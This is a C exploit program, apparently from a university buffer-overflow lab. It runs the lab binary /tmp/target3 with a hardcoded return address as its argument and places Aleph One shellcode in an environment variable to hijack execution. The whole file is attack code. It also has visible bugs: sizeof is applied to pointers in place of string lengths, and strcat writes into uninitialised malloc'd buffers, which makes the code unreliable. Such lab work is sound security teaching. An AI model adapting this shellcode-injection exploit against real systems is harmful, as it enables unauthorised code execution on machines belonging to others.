#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3]; 
  char *env[1];

   //bfffffa1
  char *address = "\xa1\xff\xff\xbf";
  char *result = malloc(sizeof(address) + 1);
  strcat(result, address);

  char *preface = "shellcode=";
  char *envvar = malloc(sizeof(preface)+sizeof(shellcodeAlephOne)+1);
  strcat(envvar, preface);
  strcat(envvar, shellcodeAlephOne);
  args[0] = TARGET;
  args[1] = result;
  args[2] = NULL;
  
  env[0] = envvar;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


